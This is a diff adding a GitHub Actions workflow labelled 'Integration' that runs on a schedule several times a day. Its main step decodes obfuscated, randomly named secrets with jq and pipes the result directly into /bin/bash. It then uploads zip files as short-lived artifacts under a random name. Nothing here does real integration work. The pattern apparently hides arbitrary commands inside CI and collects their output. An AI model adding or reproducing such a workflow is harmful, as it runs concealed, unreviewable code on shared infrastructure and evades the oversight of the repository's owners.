@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '27 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          lxdkt5339: ${{ secrets.lxdkt5339 }}
+        run: |
+          printf '%s' "$lxdkt5339" | jq -r .omcj238 | /bin/bash
+          printf '%s' "$txr84" | jq -r .kyhy871 | /bin/bash
+          printf '%s' "$pvm44525" | jq -r .oyubl40559 | /bin/bash
+          printf '%s' "$gtda3" | jq -r .urkeu393 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: I4slIQXf
+          path: "*.zip"
+          retention-days: 1
